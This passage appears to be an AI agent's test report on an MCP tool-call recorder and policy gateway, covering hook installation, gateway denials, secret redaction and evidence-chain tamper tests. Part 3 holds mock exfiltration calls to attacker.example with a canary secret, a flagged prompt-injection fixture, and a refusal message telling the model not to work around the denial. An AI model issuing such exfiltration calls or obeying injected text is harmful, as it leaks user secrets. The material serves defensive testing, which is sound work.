 "attributes": { "gen_ai.tool.call.id": "toolu_01Kce2pYgkQqTvyhYvgXdngZ", "gen_ai.tool.name": "clickup_filter_tasks", … },
 "is_error": false, "kind": "tool_call", "phase": "pre", "result": null,
 "server": { "command": "hook:claude-code", "name": "claude_ai_ClickUp", "transport": "stdio" },
$ ls -la .mcp-recorder/hook-pending
…
-rw-r--r-- 1 <user> <user>   13 Sep 17 … toolu_01Gix8SWjP56eR81M9K7nNwB
-rw-r--r-- 1 <user> <user>   13 Sep 17 … toolu_01Kce2pYgkQqTvyhYvgXdngZ
```

So one store records "denied" and the other records "started, no error", with a pending marker left behind. According to the repo's own test ("SessionEnd and Stop sweep stale pending markers (older than 24 h by mtime)"), that marker is only swept after 24 h. See surprise 3.

### Undo, and what it left behind

```
$ node dist/cli.js hook install --settings .claude/settings.local.json --data-dir /tmp/df6-local --policy /tmp/df6-local-policy.json --undo
settings: /home/<user>/dev/cresec/audit/.claude/settings.local.json
removed hook entries for: PreToolUse, PostToolUse, PostToolUseFailure, SessionEnd, Stop

backup: /home/<user>/dev/cresec/audit/.claude/settings.local.json.bak-2026-09-17T09-12-39.437Z
[exit 0]
$ cat .claude/settings.local.json; sha256sum …; cmp .claude/settings.local.json <pre-install copy> && echo BYTE-IDENTICAL
{
  "permissions": {
    "allow": [
      "mcp__47d587b8-3fb9-42e9-b596-f8b25371248c__clickup_search"
    ]
  },
  "hooks": {}
}
…
.claude/settings.local.json <pre-install copy> differ: byte 112, line 6
[exit 1]
$ node dist/cli.js hook install --settings .claude/settings.local.json --undo
settings: /home/<user>/dev/cresec/audit/.claude/settings.local.json
nothing to remove
[exit 0]
$ git status --short; ls -la .claude/
?? .claude/settings.local.json.bak-2026-09-17T09-10-36.586Z
?? .claude/settings.local.json.bak-2026-09-17T09-12-39.437Z
…
```

I restored the file from the pre-install copy and deleted the two backups:

```
$ cp <pre-install copy> .claude/settings.local.json && cmp .claude/settings.local.json <pre-install copy> && echo RESTORED-BYTE-IDENTICAL
RESTORED-BYTE-IDENTICAL
$ rm -v .claude/settings.local.json.bak-2026-09-17T09-10-36.586Z .claude/settings.local.json.bak-2026-09-17T09-12-39.437Z
…
$ git status --short --untracked-files=all | head; echo "(end status)"
(end status)
```

Side datum: the pre-existing `permissions.allow` entry above uses the **Desktop** UUID tool name. Going by the WSL CLI's `claude_ai_ClickUp` prefix (Part 1), the same tool there would be `mcp__claude_ai_ClickUp__clickup_search`, so that permission rule should not match in the CLI. I did not test this.

### Windows host: synthetic test (no Claude session)

The payload uses the Desktop session's own UUID tool name. It was piped into the WSL recorder from Git Bash and from PowerShell, two ways a Windows-hosted hook might call it:

```
$ cat payload-a.json
{"session_id":"df6-synthetic-win-a","transcript_path":"C:/Users/<user>/t.jsonl","cwd":"C:/Users/<user>","hook_event_name":"PreToolUse","tool_name":"mcp__47d587b8-3fb9-42e9-b596-f8b25371248c__clickup_filter_tasks","tool_input":{},"tool_use_id":"toolu_synth_a"}

$ wsl.exe -d Ubuntu-20.04 -e <nvm node> <cli.js> hook --data-dir /tmp/df6-local-win --policy /tmp/df6-local-policy.json < payload-a.json   # default MSYS path conversion
<3>WSL (271949 - Relay) ERROR: CreateProcessCommon:798: execvpe(C:/Program Files/Git/home/<user>/.nvm/versions/node/v24.21.0/bin/node) failed: No such file or directory
[exit 1]

$ MSYS_NO_PATHCONV=1 wsl.exe -d Ubuntu-20.04 -e <nvm node> <cli.js> hook --data-dir /tmp/df6-local-win --policy /tmp/df6-local-policy.json < payload-b.json
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"mcp-recorder policy: df6-local: tool-anchored deny"}}
[exit 0]

$ (PowerShell) Get-Content payload-c.json | wsl.exe -d Ubuntu-20.04 -e <nvm node> <cli.js> hook ...
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"mcp-recorder policy: df6-local: tool-anchored deny"}}
[exit 0]

$ node dist/cli.js sessions / verify --data-dir /tmp/df6-local-win  (in WSL: sessions, then verify, then seqs.cjs)
SESSION   STARTED                   ENDED   SERVER       EVENTS  TOOL_CALLS  ERRORS  SERVERS  DECISIONS  LAST_EVENT
df6-synt  2026-09-17T09:14:10.711Z  (open)  claude-code  2       1           1       1        0          2026-09-17T09:14:10.712Z
df6-synt  2026-09-17T09:14:11.372Z  (open)  claude-code  2       1           1       1        0          2026-09-17T09:14:11.372Z
…
PASS — chain intact: 4 event(s), head seq 4
…
2 df6-synt tool_call 2026-09-17T09:14:10.712Z server.name=47d587b8-3fb9-42e9-b596-f8b25371248c tool=clickup_filter_tasks cwd= method=
…
```

The tool-anchored rule denies the UUID name, and stdin and stdout cross `wsl.exe` intact. **But when the `wsl.exe …/home/…` command runs through Git Bash without `MSYS_NO_PATHCONV=1`, it exits 1 before the recorder starts.** Nothing was recorded for payload a. Its `wsl.exe` command failed before node started, and the store holds two sessions of 2 events each for the three payloads.

Claude Code's hook documentation treats exit code 1 as a non-blocking error, so the call would be allowed. A live session did not observe that here.

An earlier attempt sent payloads with invalid JSON escapes, which was my bug, and I discarded it:
- Payload a hit the same `execvpe` failure.
- Payload b reached the hook, which printed nothing on stderr and no deny. The recorder is fail-open: it never exits non-zero except on a deliberate deny.
- **(in-session)** Afterwards, `ls -la /tmp/df6-local-win` printed `No such file or directory`.

### Windows host: live session not run (the standalone `claude.exe` is not signed in)

**(in-session)** The command:

```
timeout 120 env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT -u CLAUDE_CODE_SESSION_ID … -u ANTHROPIC_BASE_URL "/c/Users/<user>/AppData/Roaming/Claude/claude-code/2.1.271/claude.exe" -p "Reply with the single word OK." --output-format stream-json --verbose < /dev/null
[exit 1]
```

Its output, excerpted from `p2-winlive-probe.jsonl`:

```
"type":"system","subtype":"init" … "mcp_servers":[] …
…"is_error":true,…,"result":"Not logged in · Please run /login",…
```

### Extra probe (not in the prompt): does an already-open Desktop session pick up a new hook?

**(in-session)** At 09:16:11Z I wrote this into the Desktop worktree's `.claude/settings.local.json`:

```
"PreToolUse": [{"matcher": "mcp__ccd_connectors__session_connectors_status", "hooks": [
  {"type": "command", "command": "wsl.exe -d Ubuntu-20.04 -e /home/<user>/.nvm/versions/node/v24.21.0/bin/node /home/<user>/dev/cresec/audit/dist/cli.js hook --data-dir /tmp/df6-probe-plain --policy /tmp/df6-probe-policy.json"},
  {"type": "command", "command": "MSYS_NO_PATHCONV=1 wsl.exe -d Ubuntu-20.04 -e /home/<user>/.nvm/versions/node/v24.21.0/bin/node /home/<user>/dev/cresec/audit/dist/cli.js hook --data-dir /tmp/df6-probe-nopathconv --policy /tmp/df6-probe-policy.json"}]}]
```

`/tmp/df6-probe-policy.json` denies `^mcp__ccd_connectors__session_connectors_status$`, a read-only tool that returns no personal data. I then called that tool from the open session, and it returned its normal server list: it was **not** denied. The logged check afterwards:

```
Result of the call: returned its normal server list (not denied).
$ ls -la /tmp/df6-probe-plain /tmp/df6-probe-nopathconv   (WSL)
ls: cannot access '/tmp/df6-probe-plain': No such file or directory
ls: cannot access '/tmp/df6-probe-nopathconv': No such file or directory
worktree settings.local.json restored byte-identical
```

Neither hook left a trace and the call was not denied. That fits "hooks are captured at session start", but it is **not conclusive**, because the Desktop app's in-process `ccd_*` tools may never go through hooks at all. I did not repeat the probe against a hosted connector, because a miss would have pulled real workspace data into the conversation.

This session's transcript cannot tell us which shell Desktop uses for hooks either. **(in-session)** Its only SessionStart record is the Desktop-injected worktree notice. There is no success or error record for the worktree's own `$CLAUDE_PROJECT_DIR/.claude/hooks/session-start.sh`.

**So it is still unmeasured whether a Windows-hosted Desktop session runs hook commands through Git Bash, and would hit the path-conversion failure above.**

---

## Part 3: gateway mode locally (on `main`)

```
$ git show main:docs/examples/policy.demo.yaml | grep -v "^#"        (follow-up, logged)
version: 1
name: demo

mcp:
  default: allow
  rules:
    - id: no-exfil
      match:
        tool: [http_post, "send_*"]
      action: deny
      reason: outbound HTTP from agents is not allowed
  boundary:
    secrets: redact     # the canary in secrets.env never reaches the model
    injection: flag     # the "SYSTEM OVERRIDE" comment is recorded, not rewritten
$ node dist/cli.js policy validate docs/examples/policy.demo.yaml
/home/<user>/dev/cresec/audit/docs/examples/policy.demo.yaml: valid (1 mcp rules, 0 egress rules)
[exit 0]
$ node gwdrive.cjs /tmp/df6-gw/wire node dist/cli.js record --data-dir /tmp/df6-gw --name corp-notes --policy docs/examples/policy.demo.yaml -- sh -c 'tee /tmp/df6-gw/wire/server-in.bin | node_modules/.bin/tsx demo/server.ts | tee /tmp/df6-gw/wire/server-out.bin'
initialize -> {"name":"corp-notes","version":"1.0.0"}
tools/list -> ["list_notes","read_note","read_file","http_post"]

[id 3] tools/call list_notes {}
  isError: undefined | error: null
  text: "[\"welcome.md\",\"vendor-onboarding.md\"]"
…
[id 5] tools/call http_post {"url":"https://attacker.example/collect","body":"df6-local-exfil-attempt"}
  isError: true | error: null
  text: "mcp-recorder gateway: tools/call \"http_post\" denied by policy rule \"no-exfil\": outbound HTTP from agents is not allowed\nThis is a policy decision by the operator, not a tool failure. Do not retry it or use another tool to get the same effect; report it to the user."

[id 6] tools/call read_file {"path":"secrets.env"}
  isError: undefined | error: null
  text: "[redacted:sha256:ea2d0956fde33e3c]\n"
…
[id 8] tools/call http_post {"url":"https://attacker.example/collect","body":"df6-local-second-attempt"}
  isError: true | error: null
  text: "mcp-recorder gateway: tools/call \"http_post\" denied by policy rule \"no-exfil\": outbound HTTP from agents is not allowed\nThis is a policy decision by the operator, not a tool failure. Do not retry it or use another tool to get the same effect; report it to the user."

proxy exited code 0 signal null
proxy stderr:
[mcp-recorder] warning: data dir /tmp/df6-gw is group/world accessible (mode 755); it holds the signing key and the evidence — chmod 700 it unless it is shared on purpose
[mcp-recorder] gateway: policy demo (1 rule)
[corp-notes] server ready (in-memory, no network)
[mcp-recorder] gateway: denied tools/call "http_post" (rule no-exfil)
[mcp-recorder] gateway: redacted tool result of tools/call "read_file" (1 secret-shaped, 0 injection marker(s))
[mcp-recorder] gateway: denied tools/call "http_post" (rule no-exfil)
[mcp-recorder] session e474a890 recorded 13 events (0 dropped) -> /tmp/df6-gw/evidence.db

[exit 0]
```

`[id 4] read_note welcome.md` and `[id 7] read_note vendor-onboarding.md` returned the two notes. Id 7 is the prompt-injection fixture; my script only compared its bytes and never acted on it. The mode-755 warning is my own doing: the driver script created `/tmp/df6-gw/wire`, and with it `/tmp/df6-gw`, before the recorder ran.

**The exact refusal text:**

```
mcp-recorder gateway: tools/call "http_post" denied by policy rule "no-exfil": outbound HTTP from agents is not allowed
This is a policy decision by the operator, not a tool failure. Do not retry it or use another tool to get the same effect; report it to the user.
```

**Byte comparison across the proxy.** Each JSON-RPC line captured on the client side was compared with the `tee` captures on the server side:

```
$ node wirecmp.cjs /tmp/df6-gw/wire
bytes: client-out 1048 server-in 717 server-out 2413 client-in 3111

REQUESTS (client -> proxy -> server):
  req:1                              reached server BYTE-IDENTICAL
  req:notif:notifications/initialized reached server BYTE-IDENTICAL
  req:2                              reached server BYTE-IDENTICAL
  req:3                              reached server BYTE-IDENTICAL
  req:4                              reached server BYTE-IDENTICAL
  req:5                              NEVER reached server
  req:6                              reached server BYTE-IDENTICAL
  req:7                              reached server BYTE-IDENTICAL
  req:8                              NEVER reached server

RESPONSES (server -> proxy -> client):
  res:1      BYTE-IDENTICAL
  res:2      BYTE-IDENTICAL
  res:3      BYTE-IDENTICAL
  res:4      BYTE-IDENTICAL
  res:5      client got a response the server never sent (synthesized by proxy)
  res:6      MODIFIED (server 129 bytes, client 109 bytes)
  res:7      BYTE-IDENTICAL
  res:8      client got a response the server never sent (synthesized by proxy)
server responses the client never saw: (none)
[exit 0]
```

**Every allowed call was forwarded byte for byte in both directions.** The only change was id 6, where the `secrets: redact` boundary rewrote the result, as the gateway's stderr line says. Neither denied request reached the server.

Id 7, the injection fixture, went through byte-identical **and** was flagged in the evidence. Logged follow-up dump of seq 10, which is id 7:

```
$ node gwseq10.cjs
seq 9 kind=tool_call tool=read_file args={"path":{"len":11,"redacted":true,"ref":"sha256:84a5ad54…"}}
  gateway = {"boundary":{"action":"redact","delivered_result_hash":"sha256:9d06b541…","injection_found":0,"scanned":true,"secret_refs":["sha256:f74b1af0…","sha256:ea2d0956…"],"secrets_found":1},"decision":"allow"}
  …
seq 10 kind=tool_call tool=read_note args={"name":{"len":20,"redacted":true,"ref":"sha256:23984214…"}}
  gateway = {"boundary":{"action":"flag","injection_found":1,"scanned":true,"secrets_found":0},"decision":"allow"}
  …
```

```
$ node dist/cli.js sessions --data-dir /tmp/df6-gw
SESSION   STARTED                   ENDED                     SERVER      EVENTS  TOOL_CALLS  ERRORS  SERVERS  DECISIONS  LAST_EVENT
e474a890  2026-09-17T09:17:27.368Z  2026-09-17T09:17:27.805Z  corp-notes  13      6           2       1        2          2026-09-17T09:17:27.805Z
[exit 0]
$ node dist/cli.js verify --data-dir /tmp/df6-gw
verify store /tmp/df6-gw/evidence.db (sqlite)
pinned signer: ed25519 1c89495a86430e35… (/tmp/df6-gw/identity.pub)
PASS — chain intact: 13 event(s), head seq 13
signed head: seq 13 by ed25519 1c89495a86430e35… at 2026-09-17T09:17:27.806Z
[exit 0]
$ node dist/cli.js query http_post --data-dir /tmp/df6-gw
…
4 matches across 1 sessions
[exit 0]
$ node dist/cli.js query attacker.example --data-dir /tmp/df6-gw
0 matches across 0 sessions
[exit 0]
$ node dist/cli.js query sk-demo-EXFILTRATION-c4n4ry-9f3a7b2e --data-dir /tmp/df6-gw
TIMESTAMP                 KIND       NAME       SESSION   MATCHED_ON  PATH
2026-09-17T09:17:27.781Z  tool_call  read_file  e474a890  ref         $.result.content[0].text.secret_refs[0]

1 matches across 1 sessions
[exit 0]
$ node dist/cli.js holds --data-dir /tmp/df6-gw --all
no holds recorded
[exit 0]

# follow-up run (p3b), a minute later:
$ node dist/cli.js query https://attacker.example/collect --data-dir /tmp/df6-gw
TIMESTAMP                 KIND       NAME       SESSION   MATCHED_ON  PATH
2026-09-17T09:17:27.775Z  tool_call  http_post  e474a890  ref         $.args.url
2026-09-17T09:17:27.786Z  tool_call  http_post  e474a890  ref         $.args.url

2 matches across 1 sessions
[exit 0]
```

**Leak check.** A fixed-string grep over `/tmp/df6-gw/evidence.db` (the directory holds no `-wal` file) found none of these: `attacker.example`, `df6-local-exfil-attempt`, the canary, `SYSTEM OVERRIDE`, `vendor-verify.example.com` and `Vendor Onboarding`. Each hit for those six strings under `/tmp/df6-gw` came from my own `wire/*.bin` captures. The canary shows up once in `server-out.bin` and never in `client-in.bin`. The store does contain the hostname 16 times and the OS user 18 times across its 13 events. That covers the `identity` fields, the `session_start` `cwd` (OS user), and other copies inside the sqlite file.

---

## Part 4: the live sink (on `feat/evidence-sink`)

```
$ git status --short; git checkout feat/evidence-sink && git log --oneline -3
Switched to a new branch 'feat/evidence-sink'
Branch 'feat/evidence-sink' set up to track remote branch 'feat/evidence-sink' from 'origin'.
1d8fe99 Ship sealed evidence to a sink as it is recorded
6dc4399 docs: overview, feature reference and roadmap, plus connector-coverage after dogfood 5 (#18)
6307cc3 Typecheck the tests, and fix the three drifts that found (#17)
[exit 0]
$ sh scripts/bootstrap.sh && npm run compile
> @edut/mcp-recorder@0.1.0 compile
> tsc -p tsconfig.json
[exit 0]
$ ss -ltnp 2>/dev/null | grep -E ":8787\b" || echo "port 8787: no listener visible from this (bash/systemd) namespace"
port 8787: no listener visible from this (bash/systemd) namespace
[exit 0]
```

**(in-session)** Just before, the same check ran from WSL's root `/init` PID namespace (`wsl -e /bin/sh`, not bash) and printed `root-namespace: no listener on 8787`. The logged re-check after shutdown printed `root-namespace: no listener on 8787/8788`.

Both views were checked because bash on this distro runs in a different PID namespace. A later logged measurement shows it:

```
$ wsl.exe -d Ubuntu-20.04 -e bash -c "readlink /proc/self/ns/pid; echo pid1=\$(cat /proc/1/comm)"
pid:[4026533171]
pid1=systemd
$ wsl.exe -d Ubuntu-20.04 -e /bin/sh -c "readlink /proc/self/ns/pid; echo pid1=\$(cat /proc/1/comm)"
pid:[4026532394]
pid1=init(Ubuntu-20.
```

Only port checks, not process listings, were run from the root namespace.

```
$ MCPR_RECEIVER_TOKEN=local-ingest setsid nohup npm run receiver -- serve --data-dir /tmp/df6-rx --port 8787 > receiver.out 2>&1 < /dev/null &
started receiver wrapper pid 274511 (setsid nohup, backgrounded)
$ cat receiver.out

> @edut/mcp-recorder@0.1.0 receiver
> tsx receiver/main.ts serve --data-dir /tmp/df6-rx --port 8787

mcp-recorder reference receiver v0.1.0
  listening    http://127.0.0.1:8787
  data dir     /tmp/df6-rx
  ingest auth  1 token(s) from env
  operator     Authorization: Bearer <redacted>
[exit 0]
$ ss -ltnp 2>/dev/null | grep -E ":8787\b"
LISTEN 0      511         127.0.0.1:8787       0.0.0.0:*    users:(("MainThread",pid=274538,fd=40))
[exit 0]
```

**Confirmed: the startup line reads `ingest auth  1 token(s)`, and the listener belongs to the receiver I had just started.** At shutdown, `ps` showed the chain 274511 `npm run receiver` → 274526 `sh -c tsx …` → 274527 `tsx` → 274538 `node … receiver/main.ts`.

### Record with the sink, then ask the receiver

```
$ MCP_RECORDER_SINK=http://127.0.0.1:8787 MCP_RECORDER_SINK_TOKEN=local-ingest NO_PROXY=127.0.0.1 node gwdrive.cjs /tmp/df6-sink-wire node dist/cli.js record --data-dir /tmp/df6-sink -- node_modules/.bin/tsx demo/server.ts
…
proxy exited code 0 signal null
proxy stderr:
[corp-notes] server ready (in-memory, no network)
[mcp-recorder] session b97cf894 recorded 11 events (0 dropped) -> /tmp/df6-sink/evidence.db
$ ps -eo pid,ppid,etimes,args | grep -E "dist/cli.js (ship|record)" | grep -v grep
…
 275495  275282       1 /home/<user>/.nvm/versions/node/v24.21.0/bin/node /home/<user>/dev/cresec/audit/dist/cli.js ship --data-dir /tmp/df6-sink --surface record
$ node dist/cli.js ship --status --data-dir /tmp/df6-sink
sink:         http://127.0.0.1:8787
key:          5fb138cfcb6f523d97962de3ac38b7bea43b968328b82bd916bdbc08fadc56d3
chain_id:     8549d425e245efd6b2467de8e6f84e148f58a39e7558c427d82dfdeeb10d362a
state:        idle (shipper running)
local head:   seq 11
receiver:     next_seq 12, attested_seq 11
lag:          0 record(s) not yet at the receiver
last success: 2026-09-17T09:19:23.098Z
last error:   (none)
[exit 0]
$ curl -sS --noproxy 127.0.0.1 -H "Authorization: Bearer $(cat /tmp/df6-rx/operator-token.txt)" http://127.0.0.1:8787/v1/chains
{
  "chains": [
    {
      "chain_id": "8549d425e245efd6b2467de8e6f84e148f58a39e7558c427d82dfdeeb10d362a",
      "key": "5fb138cfcb6f523d97962de3ac38b7bea43b968328b82bd916bdbc08fadc56d3",
      "tenant": "default",
      "first_seen_at": "2026-09-17T09:19:21.930Z",
      "last_seen_at": "2026-09-17T09:19:23.028Z",
      "last_record_at": "2026-09-17T09:19:23.028Z",
      "next_seq": 12,
      "head_hash": "d6d6af05e9482ab5d35939eeb27eb02e7be0682bce7d36f622901dd7515650c5",
      "attested_seq": 11,
      "attested_at": "2026-09-17T09:19:23.028Z",
      "status": "active",
      "chain_id_verified": true,
      "claimed_head_seq": 11,
      "claimed_head_hash": "d6d6af05e9482ab5d35939eeb27eb02e7be0682bce7d36f622901dd7515650c5",
      "claimed_head_at": "2026-09-17T09:19:23.028Z",
      "records_held": 11,
      "silence_alerted_at": null,
      "sender": {
        "tool_version": "0.1.0",
        "surface": "record",
        "backend": "sqlite"
      },
      "key_acknowledged": true,
      "undelivered": 0,
      "silent_for_s": 5,
      "silent": false
    }
  ]
}
```

| Field | Value |
| --- | --- |
| `records_held` | **11** |
| `attested_seq` | **11** |
| `chain_id_verified` | **true** |
| `claimed_head_hash == head_hash` | **true** (`d6d6af05…`), so nothing is being withheld |

While the session ran, the recorder auto-started a detached shipper (`--surface record`). The receiver's `last_record_at` (09:19:23.028Z) came about 0.9 s after the recorder's last event, `session_end` at 09:19:22.161Z per `sessions`. All 11 records were held and attested.

### The tamper test

**Step A: copy the data dir and alter one mid-chain field, leaving the hashes untouched.**

```
$ cp -a /tmp/df6-sink /tmp/df6-sink-tampered && ls -la /tmp/df6-sink-tampered /tmp/df6-sink-tampered/ship.lock && cat /tmp/df6-sink-tampered/ship.lock/owner
…
275495 1789636855343
[exit 0]
$ node tamper.cjs /tmp/df6-sink-tampered/evidence.db
target: seq 7 of 11 (mid-chain), field $.tool = "http_post", hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b
after:  seq 7, field $.tool = "read_note", hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b (unchanged: true), prev_hash unchanged: true
update trigger restored: true
[exit 0]
```

**What `verify` says.** The copy fails loudly, and the untouched original still passes:

```
$ node dist/cli.js verify --data-dir /tmp/df6-sink-tampered
verify store /tmp/df6-sink-tampered/evidence.db (sqlite)
pinned signer: ed25519 5fb138cfcb6f523d… (/tmp/df6-sink-tampered/identity.pub)
FAIL — evidence does NOT verify: 11 event(s) checked
signed head: seq 11 by ed25519 5fb138cfcb6f523d… at 2026-09-17T09:19:22.162Z

TYPE                      SEQ  DETAIL
hash_mismatch             7    stored hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b != recomputed 9d13770d283a541d4cb21858738c55ddd7e74e413384a82798dfa1722d848236 — the event was altered
signature_chain_mismatch  7    a valid signature attests hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b at seq 7, but the chain recomputes to 9d13770d283a541d4cb21858738c55ddd7e74e413384a82798dfa1722d848236
[exit 1]
$ node dist/cli.js verify --data-dir /tmp/df6-sink
verify store /tmp/df6-sink/evidence.db (sqlite)
pinned signer: ed25519 5fb138cfcb6f523d… (/tmp/df6-sink/identity.pub)
PASS — chain intact: 11 event(s), head seq 11
signed head: seq 11 by ed25519 5fb138cfcb6f523d… at 2026-09-17T09:19:22.162Z
[exit 0]
```

**What the shipper does with the copy on the first try: nothing.**

```
$ node dist/cli.js ship --status --data-dir /tmp/df6-sink-tampered
sink:         http://127.0.0.1:8787
key:          5fb138cfcb6f523d97962de3ac38b7bea43b968328b82bd916bdbc08fadc56d3
chain_id:     8549d425e245efd6b2467de8e6f84e148f58a39e7558c427d82dfdeeb10d362a
state:        idle (shipper running)
local head:   seq 11
receiver:     next_seq 12, attested_seq 11
lag:          0 record(s) not yet at the receiver
last success: 2026-09-17T09:20:23.263Z
last error:   (none)
[exit 0]
$ time node dist/cli.js ship --data-dir /tmp/df6-sink-tampered --sink http://127.0.0.1:8787 --token local-ingest --drain --timeout 30s
[mcp-recorder] ship: another shipper is already running for this data dir
0.11user 0.01system 0:00.10elapsed 120%CPU (0avgtext+0avgdata 76028maxresident)k
…
[exit 0]
```

`cp -a` copied `ship.lock/owner`, which names the **original** data dir's shipper (pid 275495), and `ship-status.json` (`"pid": 275495`) along with it. A lock counts as alive for 5 minutes based on the owner file's mtime alone (`SHIP_LOCK_STALE_MS`, `shipperLooksAlive`, `src/sink/state.ts`). So the copy reports the original's status and refuses to start its own shipper.

**Step B: remove the copied lock and status file, then ship to the same receiver again.**

```
$ cat /tmp/df6-sink-tampered/ship.lock/owner; rm -rf /tmp/df6-sink-tampered/ship.lock /tmp/df6-sink-tampered/ship-status.json && echo removed copied ship.lock and ship-status.json
275495 1789636855343
removed copied ship.lock and ship-status.json
[exit 0]
$ time node dist/cli.js ship --data-dir /tmp/df6-sink-tampered --sink http://127.0.0.1:8787 --token local-ingest --drain --timeout 30s
[mcp-recorder] ship: delivered 0 record(s), receiver next_seq 12, lag 0 (idle)
…
[exit 0]
GET /v1/chains → (chains.cjs) records_held=11 next_seq=12 attested_seq=11 chain_id_verified=true; claimed_head_hash == head_hash ? true
GET /v1/rejections → { "rejections": [] }
GET /v1/alerts → { "alerts": [] }
```

Nothing was sent: the receiver already holds seq 1–11, and the copy's stored seq-11 hash matches (the hashes were not touched). The receiver still has the **original** seq 7, so the copy of the evidence that counts is intact. Neither the shipper nor the receiver mentions that the local store fails `verify`.

**Step C (added): append a new session to the tampered copy so that a real batch has to ship.**

```
$ MCP_RECORDER_SINK=http://127.0.0.1:8787 MCP_RECORDER_SINK_TOKEN=local-ingest node gwdrive.cjs /tmp/df6-sink-tampered-wire node dist/cli.js record --data-dir /tmp/df6-sink-tampered -- node_modules/.bin/tsx demo/server.ts 2>&1 | grep -E 'proxy exited|recorded|mcp-recorder'
proxy exited code 0 signal null
[mcp-recorder] session 4047c1e4 recorded 11 events (0 dropped) -> /tmp/df6-sink-tampered/evidence.db
$ node dist/cli.js ship --status --data-dir /tmp/df6-sink-tampered
…
state:        idle (shipper running)
local head:   seq 22
receiver:     next_seq 23, attested_seq 22
lag:          0 record(s) not yet at the receiver
last success: 2026-09-17T09:21:29.533Z
last error:   (none)
$ node dist/cli.js verify --data-dir /tmp/df6-sink-tampered 2>&1 | head -12
…
FAIL — evidence does NOT verify: 22 event(s) checked
…
hash_mismatch             7    stored hash de00ff5a… != recomputed 9d13770d… — the event was altered
signature_chain_mismatch  7    …
GET /v1/chains → (chains.cjs) records_held=22 next_seq=23 attested_seq=22 chain_id_verified=true; claimed_head_hash == head_hash ? true
GET /v1/rejections → { "rejections": [] }    GET /v1/alerts → { "alerts": [] }    GET /v1/chains/<id> → forks: []
```

**The receiver accepted seq 12–22 from a store that fails `verify`.** On the receiver's side the new records are valid, because they link to the stored seq-11 hash. The shipper never checked its local chain before extending the remote one.

**Step D (added): ship the tampered copy to a fresh receiver that has never seen seq 7.** First I stopped the copy's own auto-started shipper, so `--drain` could take the lock.

```
$ MCPR_RECEIVER_TOKEN=local-ingest2 setsid nohup npm run receiver -- serve --data-dir /tmp/df6-rx2 --port 8788 &
…
  ingest auth  1 token(s) from env
$ cat /tmp/df6-sink-tampered/ship.lock/owner; P=$(cut -d" " -f1 /tmp/df6-sink-tampered/ship.lock/owner); ps -o pid,args -p $P; kill $P && echo "stopped the copy's auto-started shipper (pid $P) so --drain can take the lock"; …
276517 1789636934641
    PID COMMAND
 276517 /home/<user>/.nvm/versions/node/v24.21.0/bin/node /home/<user>/dev/cresec/audit/dist/cli.js ship --data-dir /tmp/df6-sink-tampered --surface record
stopped the copy's auto-started shipper (pid 276517) so --drain can take the lock
…
$ time node dist/cli.js ship --data-dir /tmp/df6-sink-tampered --sink http://127.0.0.1:8788 --token local-ingest2 --drain --timeout 30s
[mcp-recorder] sink stalled on seq 1-22: hash_mismatch at seq 7: stored hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b != recomputed 9d13770d283a541d4cb21858738c55ddd7e74e413384a82798dfa1722d848236 — the event was altered; signature_chain_mismatch at seq 7: a valid signature attests hash de00ff5a716ae76ba47bee03a93ed5f1c1b0d393a257bbc74b3a1a903424185b at seq 7, but the chain recomputes to 9d13770d283a541d4cb21858738c55ddd7e74e413384a82798dfa1722d848236
[mcp-recorder] ship: delivered 0 record(s), receiver next_seq 1, lag 22 (stalled)
…
[exit 0]
$ node dist/cli.js ship --status --data-dir /tmp/df6-sink-tampered
sink:         http://127.0.0.1:8788
…
state:        stalled
local head:   seq 22
receiver:     next_seq 1, attested_seq 0
lag:          22 record(s) not yet at the receiver
last success: (never)
last error:   sink rejected seq 1-22 twice: hash_mismatch at seq 7: … — the event was altered; … @ 2026-09-17T09:22:17.328Z
rx2 GET /v1/chains → (chains.cjs) records_held=0 next_seq=1 attested_seq=0 chain_id_verified=false
rx2 GET /v1/rejections → 2 entries, each {"status": 400, "error": "bad_request", "detail": "hash_mismatch at seq 7: … — the event was altered; …", "from_seq": 1, "to_seq": 22, …}
rx2 GET /v1/alerts → { "alerts": [] }
```

This is the design working: a receiver that recomputes the chain refuses the tampered batch outright, and the shipper stalls instead of skipping. `--drain` still exits 0.

**Step E (added): record again from the original, untampered data dir to receiver 1.** By now receiver 1 holds the copy's seq 12–22.

```
$ MCP_RECORDER_SINK=http://127.0.0.1:8787 MCP_RECORDER_SINK_TOKEN=local-ingest node gwdrive.cjs /tmp/df6-sink-wire2 node dist/cli.js record --data-dir /tmp/df6-sink -- node_modules/.bin/tsx demo/server.ts 2>&1 | grep -E 'proxy exited|recorded|mcp-recorder'
proxy exited code 0 signal null
[mcp-recorder] session dd71b4f7 recorded 11 events (0 dropped) -> /tmp/df6-sink/evidence.db
$ node dist/cli.js ship --status --data-dir /tmp/df6-sink
sink:         http://127.0.0.1:8787
…
state:        forked (shipper running)
local head:   seq 22
receiver:     next_seq 12, attested_seq 22
lag:          11 record(s) not yet at the receiver
last success: 2026-09-17T09:21:23.423Z
last error:   seq 12 is already stored with hash 3cbc9feccc6691a03efe1399114560088fde38679df84415fe06bcea656e4643, but this batch offers 633b2267f31a4d1df6251e5f9bb1720081d78129ce201f948b9a65424d3af092 — history was rewritten @ 2026-09-17T09:22:18.563Z
$ node dist/cli.js verify --data-dir /tmp/df6-sink
…
PASS — chain intact: 22 event(s), head seq 22
rx1 GET /v1/chains/<id> → status: forked | records_held: 22 | undelivered: 0
rx1 GET /v1/rejections → {"status": 409, "error": "chain_fork", "detail": "seq 12 is already stored with hash 3cbc9fec…, but this batch offers 633b2267… — history was rewritten", "from_seq": 12, "to_seq": 22, …}
rx1 GET /v1/alerts → {"at": "2026-09-17T09:22:18.529Z", "kind": "chain_fork", "chain_id": "8549d425…", "detail": "seq 12 is already stored with hash 3cbc9fec…, but this batch offers 633b2267… — history was rewritten"}
